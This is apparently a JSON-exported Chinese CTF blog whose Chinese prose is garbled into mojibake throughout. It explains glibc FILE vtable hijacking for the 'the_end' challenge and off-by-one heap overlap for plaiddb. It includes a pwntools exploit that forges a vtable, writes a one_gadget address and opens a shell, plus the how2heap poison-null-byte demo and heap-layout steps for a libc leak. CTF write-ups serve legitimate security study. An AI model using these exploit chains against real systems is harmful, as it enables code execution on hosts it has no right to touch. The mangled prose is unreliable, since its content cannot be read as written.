å‡½æ•°è¡¨ï¼Œå­˜äº†è®¸å¤šä¸ioæ“ä½œç›¸å…³çš„å‡½æ•°ã€‚ioæ“ä½œä¼šé€šè¿‡äº¤å‰å¼•ç”¨é—´æ¥è®¿é—®åˆ°å‡½æ•°è¡¨ä¸­çš„ç›¸å…³å‡½æ•°ã€‚è¿™å¼ å‡½æ•°è¡¨é•¿è¿™æ ·ï¼š 1234567891011121314151617181920212223const struct _IO_jump_t _IO_file_jumps =&#123; **JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_file_finish), JUMP_INIT(overflow, _IO_file_overflow), JUMP_INIT(underflow, _IO_file_underflow), JUMP_INIT(uflow, _IO_default_uflow), JUMP_INIT(pbackfail, _IO_default_pbackfail), JUMP_INIT(xsputn, _IO_file_xsputn), JUMP_INIT(xsgetn, _IO_file_xsgetn), JUMP_INIT(seekoff, _IO_new_file_seekoff), JUMP_INIT(seekpos, _IO_default_seekpos), JUMP_INIT(setbuf, _IO_new_file_setbuf), JUMP_INIT(sync, _IO_new_file_sync), JUMP_INIT(doallocate, _IO_file_doallocate), JUMP_INIT(read, _IO_file_read), JUMP_INIT(write, _IO_new_file_write), JUMP_INIT(seek, _IO_file_seek), JUMP_INIT(close, _IO_file_close), JUMP_INIT(stat, _IO_file_stat), JUMP_INIT(showmanyc, _IO_default_showmanyc), JUMP_INIT(imbue, _IO_default_imbue)&#125;; 0x01 . Vtable åŠ«æŒâ€‹ vtableï¼Œæˆ–è€…å«è™šè¡¨ã€‚IOçš„ç›¸å…³æ“ä½œä¸­ï¼ŒæŸäº›å‡½æ•°ä¼šè°ƒç”¨åˆ°è™šè¡¨ä¸­çš„å€¼ã€‚æ¯”å¦‚exit()ä¼šåœ¨ä¸€ç³»åˆ—çš„äº¤å‰å¼•ç”¨ä¸­è°ƒç”¨åˆ°å…¶è™šè¡¨ä¸­çš„setbuf()ï¼Œprintf()ä¼šç”¨åˆ°xput()ç­‰ç­‰ã€‚è¯¦ç»†çš„è°ƒç”¨åªèƒ½æŸ¥æŸ¥çœ‹ç›¸å…³å‡½æ•°çš„æºä»£ç äº†ã€‚ã€‚ã€‚ä»¥åå†è¯¦è¿°ã€‚ï¼ˆğŸ•ŠğŸ•ŠğŸ•Šï¼‰ â€‹ è™šè¡¨è¯´èµ·æ¥è·Ÿgotè¡¨pltè¡¨å·®ä¸å¤š(ä¸ªäººç†è§£)ï¼Œéƒ½å¯ä»¥é€šè¿‡åŠ«æŒè¡¨æ¥æ§åˆ¶ç¨‹åºæµç¨‹ã€‚ä½†ä¸åŒçš„æ˜¯ï¼Œgotè¡¨å¯å†™ï¼Œè™šè¡¨ä¸èƒ½ç›´æ¥æ”¹å†™ï¼Œè¿™ä¹Ÿå°±é™åˆ¶äº†æˆ‘ä»¬ä¸èƒ½ç›´æ¥ä¿®æ”¹è™šè¡¨ä½¿å…¶æŒ‡å‘ç›®æ ‡å‡½æ•°ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ªé€ è™šè¡¨è¾¾åˆ°åŒæ ·æ•ˆæœã€‚å¤§è‡´æ€è·¯å¦‚ä¸‹ï¼š è¦æ‰¾åˆ°è™šè¡¨ï¼Œå¾—å…ˆæ‰¾åˆ°å®ƒæ‰€åœ¨çš„ç»“æ„ä½“ï¼Œå³_IO_FILE_plusä½äºå“ªé‡Œã€‚è¿™é‡Œæˆ‘ä»¬éœ€è¦çŸ¥é“ï¼šå¦‚æœæ–‡ä»¶æµæ˜¯ä»¥fopen()çš„æ–¹å¼æ‰“å¼€çš„ï¼Œé‚£ä¹ˆæ–‡ä»¶æµä¼šå­˜åœ¨å †ä¸Šï¼›è€Œå¦‚æœæ˜¯stdinï¼Œstdoutï¼Œstderråˆ™æ˜¯å­˜åœ¨åº“æ–‡ä»¶ä¸­ã€‚æœ¬æ–‡ç« ä»…è€ƒè™‘åè€…çš„æƒ…å†µã€‚ é¦–å…ˆæˆ‘ä»¬è¦ç¡®å®šåº“æ–‡ä»¶çš„ç‰ˆæœ¬ï¼Œæ ¹æ®ä¸åŒç‰ˆæœ¬ç¡®å®švtableç›¸å¯¹äº_IO_FILE_pluså¼€å§‹åœ°å€çš„åç§»é‡ã€‚åœ¨libc2.23 ç‰ˆæœ¬ä¸‹ï¼Œ32 ä½çš„ vtable åç§»ä¸º 0x94ï¼Œ64 ä½åç§»ä¸º 0xd8ã€‚ æ ¹æ®åç§»æˆ‘ä»¬å°±èƒ½æ±‚å‡ºè™šè¡¨çš„åœ°å€ï¼Œå°±èƒ½ä¼ªé€ è™šè¡¨åŠ«æŒç¨‹åºæµç¨‹äº†ã€‚libc2.23ç‰ˆæœ¬ä¸‹è™šè¡¨çš„ä¼ªé€ ä¸å­˜åœ¨å®‰å…¨æ£€æµ‹ï¼Œæ›´é«˜çš„libcç‰ˆæœ¬é‡Œåˆ™éœ€è¦è®¨è®ºä¿æŠ¤ç»•è¿‡äº†ã€‚ ä¹‹åè¿˜éœ€è¦æ‰¾åˆ°å‡½æ•°è°ƒç”¨è¿‡è™šè¡¨ä¸­çš„å“ªä¸ªå‡½æ•°(victim_function)ï¼Œé€šè¿‡å›ºå®šåç§»å’Œç¨‹åºä¸­çš„å…¶ä»–æ¼æ´ï¼Œè¿›è¡Œä»»æ„å†™ï¼Œå°†victim_functionæ¢æˆone_gadgetåœ°å€ï¼Œå°±èƒ½getshellã€‚ 0x02 . the_end1 . Analysisâ€‹ ä¾‹è¡Œå…¬äº‹å¦‚ä¸‹ï¼š â€‹ mainå‡½æ•°å¦‚ä¸‹ï¼Œé™¤æ­¤ä¹‹å¤–æ²¡æœ‰å…¶ä»–ä¹±ä¸ƒå…«ç³Ÿçš„å‡½æ•°äº†ã€‚ã€‚ â€‹ åœ¨forå¾ªç¯é‡Œé¢å¯ä»¥çœ‹åˆ°ï¼Œç¨‹åºå…è®¸ç”¨æˆ·è¿›è¡Œäº”æ¬¡è¾“å…¥æ“ä½œçš„å¾ªç¯ï¼Œæ¯æ¬¡å¾ªç¯ä¸­ï¼Œå°†ç”¨æˆ·çš„ç¬¬ä¸€æ¬¡è¾“å…¥ä½œä¸ºä¸€ä¸ªåœ°å€ï¼ˆå¯å†™å…¥8ä¸ªå­—èŠ‚ï¼Œå¯¹äº64ä½ç¨‹åºæ¥è¯´æ°å¥½ä¸ºä¸€ä¸ªåœ°å€ï¼‰ï¼Œç”¨æˆ·çš„ç¬¬äºŒæ¬¡è¾“å…¥å°±å°†å†™åœ¨è¿™ä¸ªåœ°å€ä¸­ï¼ˆå¯å†™å…¥1ä¸ªå­—èŠ‚ï¼‰ã€‚ â€‹ ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥å®ç°ä»»æ„åœ°å€å†™ï¼Œä¸è¿‡åªèƒ½å†™5ä¸ªå­—èŠ‚ã€‚ â€‹ ä¸»å‡½æ•°ä¸­ï¼Œforå¾ªç¯çš„ä»»æ„å†™ç»“æŸåå°±æ˜¯exitå‡½æ•°äº†ï¼Œè€Œä¸”é¢˜ç›®â€œthe_endâ€ä¹Ÿå¾ˆæ˜æ˜¾åœ°æç¤ºäº†æ¼æ´åº”è¯¥åœ¨ç»“å°¾å¤„ï¼Œæ‰€ä»¥èªæ˜æœºæ™ºçš„æˆ‘è€ƒè™‘æ¯é¥¬æ¯é¥¬exitå‡½æ•°ã€‚ 2 . Attackâ€‹ å»äº†è§£ä¹‹åçŸ¥é“äº†exit()å‡½æ•°ä½œç”¨æ˜¯ç»“æŸå­è¿›ç¨‹ï¼Œè¿”å›ç»™çˆ¶è¿›ç¨‹ï¼Œé‚£å½“ç„¶éœ€è¦æ¸…ç†IOæµå’¯ã€‚åˆäº†è§£åˆ°å®ƒæ¸…ç†IOæµæ—¶ï¼Œç³»ç»Ÿä¼šéå†IO_list_allï¼Œè°ƒç”¨IO_2_1_stdout_ï¼Œå†è°ƒç”¨vtable ä¸­ _setbuf å‡½æ•°ã€‚ â€‹ ç”¨idaæ‰“å¼€libc-2.23.soï¼Œå…ˆæ‰¾å‡ºIO_2_1_stdout_ç¬¦å·ï¼Œä¹‹åçœ‹ç»“æ„å¯ä»¥ç¡®å®šï¼Œ0x3C56F8å¤„çš„å°±æ˜¯è™šè¡¨ã€‚ â€‹ æ ¹æ®è™šè¡¨åœ¨64ä½ç¨‹åºä¸­çš„åç§»ï¼Œå¯ä»¥æ±‚å‡ºè™šè¡¨çš„åœ°å€ã€‚ â€‹ æŸ¥ä¸€ä¸‹ä¸Šé¢çš„è™šå‡½æ•°è¡¨ï¼Œå¯ä»¥è®¡ç®—å‡ºsetbufç›¸å¯¹äºvtableçš„åç§»é‡ä¸º11 * 0x8 = 0x58ï¼ˆ64ä½ï¼‰ã€‚æ ¹æ®setbufçš„åç§»ï¼Œå¯ä»¥æ±‚å‡ºsetbufçš„åœ°å€ã€‚ â€‹ æ‰€ä»¥æˆ‘ä»¬è¦åšçš„å°±æ˜¯ï¼šä¼ªé€ ä¸€ä¸ªè™šè¡¨ï¼Œå°†fake_vtabel+0x58çš„åœ°æ–¹æ”¹æˆone_gadgetçš„åœ°å€ï¼Œå†å°†è™šè¡¨æŒ‡å‘ä¼ªé€ çš„è™šè¡¨ã€‚ç„¶åå‡½æ•°è°ƒç”¨åˆ°setbufçš„æ—¶å€™å°±ä¼šå®šä½åˆ°ä¼ªé€ è™šè¡¨ä¸­çš„one_gadgetåœ°å€ã€‚ â€‹ å› ä¸ºæˆ‘ä»¬åªèƒ½å†™å…¥5ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥fake_vtable+0x58ä¸one_gadgetï¼Œè™šè¡¨å’Œä¼ªé€ è™šè¡¨çš„åç§»éƒ½ä¸èƒ½å¤ªå¤§ã€‚æ‰€ä»¥è€ƒè™‘å°†è™šè¡¨å®šä½åœ¨è™šè¡¨çš„é™„è¿‘ï¼Œç”¨ä¸¤ä¸ªå­—èŠ‚æ¥è¦†å†™ï¼Œç„¶åå†ç”¨å‰©ä¸‹ä¸‰ä¸ªå­—èŠ‚å°†one_gadgetå†™å…¥åˆ°fake_vtable+0x58ã€‚ â€‹ æœ€ågetshellæ—¶éœ€è¦æ³¨æ„ï¼Œç¨‹åºä¸­çš„ï¼š 12close(1);close(2); â€‹ ä¸¤è¡Œä»£ç å°†è¾“å‡ºæµé”™è¯¯æµå…³æ‰äº†ï¼Œæ‰€ä»¥æœ€åæˆ‘ä»¬getshellçš„æ—¶å€™æ²¡æœ‰å›æ˜¾ï¼Œå…·ä½“å¯¹ç­–æ˜¯æœ€ågetshellåï¼Œè¿›è¡Œioé‡å®šå‘ï¼Œå°†è¾“å‡ºæµé‡å®šå‘åˆ°è¾“å…¥æµï¼Œå³ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š 1cat flag.txt 1&gt;&amp;0 3.Exploitï¼ˆfrom CTF-WikiğŸ˜“ï¼‰â€‹ ç”±äºè«åå…¶å¦™çš„åŸå› ï¼Œæˆ‘åœ¨ubuntuä¸­è¿è¡Œç¨‹åºçš„æ—¶å€™ï¼Œåªèƒ½è¿›è¡Œ7æ¬¡è¾“å…¥ï¼Œç„¶åå°±ç›´æ¥é€€å‡ºäº†ã€‚ã€‚ã€‚ã€‚ä¹Ÿä¸çŸ¥é“è‡ªå·±å†™çš„expå¯¹ä¸å¯¹ï¼Œè¿˜æ˜¯è´´ä¸€ä¸‹CTF-Wikiçš„å§ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *context.log_level=&quot;debug&quot;libc=ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)# p = process(&#x27;the_end&#x27;)p = remote(&#x27;127.0.0.1&#x27;,1234)rem = 0if rem ==1: p = remote(&#x27;150.109.44.250&#x27;,20002) p.recvuntil(&#x27;Input your token:&#x27;) p.sendline(&#x27;RyyWrOLHepeGXDy6g9gJ5PnXsBfxQ5uU&#x27;)sleep_ad = p.recvuntil(&#x27;, good luck&#x27;,drop=True).split(&#x27; &#x27;)[-1]libc_base = long(sleep_ad,16) - libc.symbols[&#x27;sleep&#x27;]one_gadget = libc_base + 0xf02b0vtables = libc_base + 0x3C56F8fake_vtable = libc_base + 0x3c5588target_addr = libc_base + 0x3c55e0print &#x27;libc_base: &#x27;,hex(libc_base)print &#x27;one_gadget:&#x27;,hex(one_gadget)print &#x27;exit_addr:&#x27;,hex(libc_base + libc.symbols[&#x27;exit&#x27;])# gdb.attach(p)for i in range(2): p.send(p64(vtables+i)) p.send(p64(fake_vtable)[i])for i in range(3): p.send(p64(target_addr+i)) p.send(p64(one_gadget)[i])p.sendline(&quot;exec /bin/sh 1&gt;&amp;0&quot;)p.interactive() â€‹ â€‹","categories":[],"tags":[{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"}]},{"title":"Off_By_One (plaiddb)","slug":"Off_By_One","date":"2020-03-16T08:09:47.000Z","updated":"2021-03-24T09:47:50.628Z","comments":true,"path":"2020/03/16/Off_By_One/","link":"","permalink":"http://example.com/2020/03/16/Off_By_One/","excerpt":"â€‹ plaiddbå¿«æŠŠæˆ‘è‚å´©æºƒäº†ã€‚ã€‚","text":"â€‹ plaiddbå¿«æŠŠæˆ‘è‚å´©æºƒäº†ã€‚ã€‚ 0x00 . Off_By_Oneâ€‹ è¿™ä¸ªçŸ¥è¯†ç‚¹åœ¨how2heapé‡Œæ˜¯å«poison_null_byteï¼Œç»“æœæˆ‘ä¸Šctf-wikiæ‰¾writeupçš„æ—¶å€™æ²¡æ‰¾ç€ï¼ŒåŸæ¥äººå®¶ä¹Ÿå«off_by_oneã€‚ä¸‹é¢å…ˆåˆ†æä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;int main()&#123; fprintf(stderr, &quot;Welcome to poison null byte 2.0!\\n&quot;); fprintf(stderr, &quot;Tested in Ubuntu 14.04 64bit.\\n&quot;); fprintf(stderr, &quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\\n&quot;); fprintf(stderr, &quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\\n&quot;); uint8_t* a; uint8_t* b; uint8_t* c; uint8_t* b1; uint8_t* b2; uint8_t* d; void *barrier; fprintf(stderr, &quot;We allocate 0x100 bytes for &#x27;a&#x27;.\\n&quot;); a = (uint8_t*) malloc(0x100); fprintf(stderr, &quot;a: %p\\n&quot;, a); int real_a_size = malloc_usable_size(a); fprintf(stderr, &quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot; &quot;(it may be more than 0x100 because of rounding): %#x\\n&quot;, real_a_size); /* chunk size attribute cannot have a least significant byte with a value of 0x00. * the least significant byte of this will be 0x10, because the size of the chunk includes * the amount requested plus some amount required for the metadata. */ b = (uint8_t*) malloc(0x200); fprintf(stderr, &quot;b: %p\\n&quot;, b); c = (uint8_t*) malloc(0x100); fprintf(stderr, &quot;c: %p\\n&quot;, c); barrier = malloc(0x100); fprintf(stderr, &quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\\n&quot; &quot;The barrier is not strictly necessary, but makes things less confusing\\n&quot;, barrier); uint64_t* b_size_ptr = (uint64_t*)(b - 8); // added fix for size==prev_size(next_chunk) check in newer versions of glibc // https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30 // this added check requires we are allowed to have null pointers in b (not just a c string) //*(size_t*)(b+0x1f0) = 0x200; fprintf(stderr, &quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot; &quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\\n&quot;); // we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00) // which is the value of b.size after its first byte has been overwritten with a NULL byte *(size_t*)(b+0x1f0) = 0x200; // this technique works by overwriting the size metadata of a free chunk free(b); fprintf(stderr, &quot;b.size: %#lx\\n&quot;, *b_size_ptr); fprintf(stderr, &quot;b.size is: (0x200 + 0x10) | prev_in_use\\n&quot;); fprintf(stderr, &quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\\n&quot;); a[real_a_size] = 0; // &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot; fprintf(stderr, &quot;b.size: %#lx\\n&quot;, *b_size_ptr); uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2; fprintf(stderr, &quot;c.prev_size is %#lx\\n&quot;,*c_prev_size_ptr); // This malloc will result in a call to unlink on the chunk where b was. // The added check (commit id: 17f487b), if not properly handled as we did before, // will detect the heap corruption now. // The check is this: chunksize(P) != prev_size (next_chunk(P)) where // P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow) // next_chunk(P) == b-0x10+0x200 == b+0x1f0 // prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200 fprintf(stderr, &quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\\n&quot;, *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8)))); b1 = malloc(0x100); fprintf(stderr, &quot;b1: %p\\n&quot;,b1); fprintf(stderr, &quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot; &quot;At this point c.prev_size should have been updated, but it was not: %#lx\\n&quot;,*c_prev_size_ptr); fprintf(stderr, &quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot; &quot;before c.prev_size: %lx\\n&quot;,*(((uint64_t*)c)-4)); fprintf(stderr, &quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\\n&quot;); // Typically b2 (the victim) will be a structure with valuable pointers that we want to control b2 = malloc(0x80); fprintf(stderr, &quot;b2: %p\\n&quot;,b2); memset(b2,&#x27;B&#x27;,0x80); fprintf(stderr, &quot;Current b2 content:\\n%s\\n&quot;,b2); fprintf(stderr, &quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\\n&quot;); free(b1); free(c); fprintf(stderr, &quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\\n&quot;); d = malloc(0x300); fprintf(stderr, &quot;d: %p\\n&quot;,d); fprintf(stderr, &quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\\n&quot;); memset(d,&#x27;D&#x27;,0x300); fprintf(stderr, &quot;New b2 content:\\n%s\\n&quot;,b2); fprintf(stderr, &quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot; &quot;for the clear explanation of this technique.\\n&quot;);&#125; â€‹ ä»£ç ä¸€å¼€å§‹è¿˜æ²¡çœ‹æ‡‚æ¥ç€ï¼Œçœ‹ç€å®ƒæŠŠbä¸€åˆ†ä¸ºäºŒä¸€å¤´é›¾æ°´ä¸çŸ¥é“å¹²å•¥ï¼Œåæ¥çœ‹äº†ä¸‹åˆ˜è€æ¿çš„blogæ‰ç†è§£çš„ã€‚ â€‹ å…¶å¤§è‡´çš„æ„æ€å°±æ˜¯ï¼šç³»ç»Ÿçš„è¾¹ç•Œæ£€æŸ¥ä¸ä¸¥è°¨ï¼Œå½“chunkå¡«å……å¤§å°ä¸ºmalloc_sizeæ—¶ï¼Œæ•´ä¸ªchunkè¢«å­—ç¬¦ä¸²å¡«æ»¡ï¼Œè€Œå­—ç¬¦ä¸²è¿˜éœ€è¦æœ‰â€™\\x00â€™å­—ç¬¦ç»“å°¾ï¼Œä¹Ÿå°±å°†ä¸‹ä¸€ä¸ªchunkçš„sizeçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ä¿®æ”¹äº†ï¼Œæœ‰å¯èƒ½åªæ”¹äº†in_useä½(0x101 â€“&gt; 0x100)ï¼Œæœ‰å¯èƒ½sizeå’Œin_useä½éƒ½æ”¹äº†(0x111 â€“&gt; 0x100)ï¼Œè¿™è¦çœ‹å…·ä½“çš„chunk_sizeå’Œåˆ©ç”¨è¿‡ç¨‹ã€‚ â€‹ å‚è€ƒå¦‚ä¸‹ç¤ºæ„å›¾ï¼ˆæ²¡æƒ³åˆ°ç”»ä¸ªå›¾è¦é‚£ä¹ˆä¹…ã€‚ã€‚ï¼‰ï¼š â€‹ 1.a = malloc(0x100) b = malloc(0x200) c = malloc(0x100) barrier = malloc(0x100)æœ€åè¿™ä¸ªchunkæ˜¯ç”¨æ¥éš”å¼€top chunkï¼Œå¦åˆ™å½“cé‡Šæ”¾æ—¶ï¼Œtop chunkä¼šå°†å…¶åˆå¹¶ã€‚ â€‹ 2.æ¥ç€ç”¨açš„æº¢å‡ºå°†b_sizeä¿®æ”¹æˆ0x200ï¼Œå¹¶åŒæ—¶åœ¨b+0x200çš„åœ°æ–¹å†™å…¥0x200ç”¨ä½œfake_pre_sizeç”¨æ¥é€šè¿‡æ£€æŸ¥ã€‚ç„¶åé‡Šæ”¾bã€‚ç³»ç»Ÿå°±ä¼šå°†båˆ°b+0x200çš„ç©ºé—´é‡Šæ”¾ï¼Œè€Œéé‡Šæ”¾æ•´ä¸ªb chunkã€‚ â€‹ 3.ç°åœ¨bçš„å¯æ§å¤§å°ä¸º0x200ï¼Œå­˜äºunsort binï¼Œç°åœ¨å°†å…¶è¿›è¡Œåˆ†å‰²ã€‚b1 = malloc(0x100)ï¼Œb2 = malloc(0x80)ã€‚b1ç”¨æ¥è¿›è¡Œunlinkåˆå¹¶ï¼Œb2ç”¨æ¥overlapã€‚ â€‹ 4.é‡Šæ”¾b1ï¼Œé‡Šæ”¾cï¼Œç³»ç»Ÿä¼šæ ¹æ®cçš„pre_sizeæ‰¾åˆ°b1çš„sizeï¼Œå‘ç°in_use == 0ï¼Œäºæ˜¯å°†å…¶åˆå¹¶ã€‚å¦‚æ­¤ä¸€æ¥ï¼Œb1åˆ°céƒ½å˜æˆäº†ä¸€ä¸ªchunkè¢«æ”¶åˆ°unsort binä¸­ã€‚ â€‹ 5.d = malloc(0x400)ï¼Œå¯ä»¥ä½¿å¾—dçš„ä¸€éƒ¨åˆ†ä¸b2å‘ç”Ÿoverlapã€‚ â€‹ 6.overlapä¹‹åå¯ä»¥è¿›è¡Œå¾ˆå¤šæ”»å‡»ã€‚ä¾‹å¦‚å…ˆfree(d)ï¼Œå†mallocå‡ºdåˆ°b2ä¸­é—´çš„éƒ¨åˆ†ï¼Œæ­¤æ—¶b2åˆ°barrierçš„å‰©ä½™ç©ºé—´ä»ä½œä¸ºä¸€ä¸ªå­¤é›¶é›¶çš„chunkå‘†åœ¨unsort binï¼Œæ‰€ä»¥å…¶fdï¼Œbkéƒ½æŒ‡å‘main arenaï¼Œå†ç”¨å¯æ§çš„chunk b2å°±å¯ä»¥leakã€‚ 0x01 . plaiddbâ€‹ å¤©çŸ¥é“æˆ‘æŸ¥äº†å¤šå°‘ä¸ªwriteupï¼Œèƒ½åŸºæœ¬çœ‹æ‡‚çš„ä¹Ÿåªæœ‰ctf-wikiçš„ã€‚ã€‚ã€‚ã€‚ï¼ˆCTF-WikiğŸ‚ğŸºï¼ï¼ï¼‰ A . Analysisâ€‹ 64ä½ï¼Œæ–‡ä»¶ä¿æŠ¤å…¨å¼€ã€‚ã€‚ â€‹ ä¸»è¦çš„æ•°æ®ç»“æ„å¦‚ä¸‹ï¼ˆå‚è€ƒå‚è€ƒCTF-Wikiï¼Œæˆ‘åªåˆ†æå‡ºå‰ä¸‰ä¸ªã€‚ã€‚ï¼‰ï¼š 123456789struct Node &#123; char *key; long data_size; char *data; struct Node *left; struct Node *right; long what_1; long what_2; &#125; â€‹ æ€ªä¸å¾—ä¸€å¤§ç‰‡ä¹±ç³Ÿç³Ÿçš„æŒ‡é’ˆæ“ä½œï¼ŒåŸæ¥æ˜¯æ ‘ç»“æ„ã€‚é‚£è¿˜åˆ†æä¸ªğŸ”¨ã€‚ â€‹ ä¸è¿‡çœ‹äº†çœ‹writeupå¥½åƒè¿™é¢˜åˆ©ç”¨è·Ÿæ ‘ç»“æ„æ²¡å•¥å…³ç³»ã€‚ â€‹ ä¸»è¦å‡½æ•°æœ‰ï¼šGET(show_single)ï¼ŒPUT(add)ï¼ŒDUMP(show_all)ï¼ŒDEL(delete)ï¼Œread_inã€‚ â€‹ æ¼æ´åœ¨read_inå‡½æ•°é‡Œï¼Œå¯ä»¥æº¢å‡ºä¸€ä¸ªç©ºå­—èŠ‚ã€‚è€Œä¸”æ­¤å¤„ç”¨åˆ°çš„æ˜¯realloc()å‡½æ•°ï¼Œç”³è¯·çš„å†…å­˜å¤§å°æ˜¯å¯ç”¨å¤§å°é€æ¬¡ä¹˜2æ‰€å¾—çš„ç»“æœï¼Œæ‰€ä»¥è¯´éœ€è¦ç‰¹å®šå¤§å°çš„chunkæ‰èƒ½è¿›è¡Œæº¢å‡ºã€‚(0x18,0x38,0x78,0xf8,0x1f8) 123456789101112131415161718192021222324252627282930313233343536373839char *sub_1040()&#123; char *v0; // r12 char *v1; // rbx size_t v2; // r14 char v3; // al char v4; // bp signed __int64 v5; // r13 char *v6; // rax v0 = malloc(8uLL); v1 = v0; v2 = malloc_usable_size(v0); while ( 1 ) &#123; v3 = _IO_getc(stdin); v4 = v3; if ( v3 == -1 ) sub_1020(); if ( v3 == 10 ) break; v5 = v1 - v0; if ( v2 &lt;= v1 - v0 ) &#123; v6 = realloc(v0, 2 * v2); //realloc require a special size of chunk v0 = v6; if ( !v6 ) &#123; puts(&quot;FATAL: Out of memory&quot;); exit(-1); &#125; v1 = &amp;v6[v5]; v2 = malloc_usable_size(v6); &#125; *v1++ = v4; &#125; *v1 = 0; //off by one return v0;&#125; â€‹ å…ˆæ¥è·‘ä¸€éç¨‹åºçœ‹çœ‹ï¼š â€‹ æ ¹æ®ä»¥ä¸‹heapç»“æ„ä»¥åŠidaçš„é™æ€åˆ†æå¯ä»¥çœ‹å‡ºï¼Œæ¯æ‰§è¡Œä¸€æ¬¡PUTï¼Œç³»ç»Ÿä¼šåˆ†é…ä¸‰ä¸ªè¿ç»­çš„chunkã€‚a.row ç»“æ„ä½“(0x40) b.row key(0x20) c.row data(size)ã€‚ç»“æ„ä½“ä¸­å­˜æœ‰æŒ‡å‘keyå’Œdataçš„æŒ‡é’ˆã€‚ B. Memory Arrangementâ€‹ 1.mallocå‡ºéœ€è¦çš„chunk 123456a = malloc(0x200); //unsort chunk,b = malloc(0x50); //overlap chunkï¼Œleak libc_basec = malloc(0x68); //ä¿®æ”¹å…¶fdï¼Œç”¨äºfast attackd = malloc(0x1f8); //æº¢å‡ºchunkï¼Œä¿®æ”¹ä¸‹ä¸€chunkçš„pre_sizeå’Œin_useå­—èŠ‚ï¼ˆç”¨åˆ°äº†off_by_oneæ¼æ´ï¼‰e = malloc(0xf0); //victim chunkï¼Œè¢«æº¢å‡ºchunkbarrier = malloc(0x400) //ç¡®ä¿ä»¥ä¸Šchunkä¸è¢«top chunkåˆå¹¶ã€‚ â€‹ 2.æŠŠaï¼Œcï¼Œdä¸‰ä¸ªchunké‡Šæ”¾ã€‚ â€‹ 3.å› ä¸ºDELå‡½æ•°ä¹Ÿç”¨åˆ°äº†read_in å‡½æ•°ï¼Œä¹Ÿå¯ä»¥è¿›è¡Œæº¢å‡ºï¼Œæ‰€ä»¥è¿™é‡ŒDEL(payload)ï¼Œpayloadå¤§å°ä¸º0x1f8ï¼Œè€Œchunk_då®é™…å¯å†™å¤§å°åªæœ‰0x1f0ï¼Œå› æ­¤å¯ä»¥åœ¨payloadçš„æœ€åå†™å…¥fake_pre_sizeï¼ŒåŒæ—¶è¦†å†™äº†chunk_eçš„pre_sizeå’Œin_useå­—èŠ‚ã€‚ â€‹ 4.ç°åœ¨é‡Šæ”¾chunk_eï¼Œç³»ç»Ÿå°†å¯»å€è‡³chunk_e - pre_size == chunk_e - 0x4e0 == chunk_a,ç³»ç»Ÿå°†chunk_a unlinkï¼Œç„¶ååˆå¹¶aåˆ°eçš„æ‰€æœ‰å†…å­˜ï¼Œå¹¶å…¥ä¸€ä¸ªunsort chunkã€‚ â€‹ 5.è€Œchunk_bè¿˜åœ¨ä½¿ç”¨ï¼Œé€ æˆäº†overlapã€‚ â€‹ 6.æ¥ä¸‹æ¥malloc(0x200)ä¸¤æ¬¡ï¼Œç¬¬ä¸€æ¬¡æ˜¯æŠŠåŸæ¥é‡Šæ”¾çš„chunk_aåˆ†é…å‡ºæ¥ï¼Œç¬¬äºŒæ¬¡æ˜¯åœ¨åæ¥è¢«ç³»ç»Ÿåˆå¹¶çš„å¤§chunkä¸­å‰²ä¸‹0x210çš„ç©ºé—´ï¼Œç„¶åè¿™ä¸ªå¤§chunkçš„åœ°å€å°†å’Œchunk_bé‡åˆã€‚ç”±äºåªæœ‰å¤§chunkä¸€ä¸ªunsort chunkåœ¨binä¸­ï¼Œå› æ­¤å…¶fdï¼ŒbkæŒ‡å‘main_arenaï¼Œäºæ˜¯å¯ä»¥æº¢å‡ºäº†ã€‚ C. Leak Libc_base &amp; get shellâ€‹ 1.GET(chunk_b)å¹¶é€šè¿‡è®¡ç®—å¯ä»¥å¾—åˆ°libc_baseï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥ç®—å‡ºmalloc_hookçš„åœ°å€ã€‚ â€‹ 2.ç”¨one_gadgetå¾—åˆ°libcä¸­excute(â€œ/bin/shâ€);çš„åœ°å€ â€‹ 3.malloc(0x100)ï¼Œå¯ä»¥å¾—åˆ°chunk_båˆ°chunk_b + 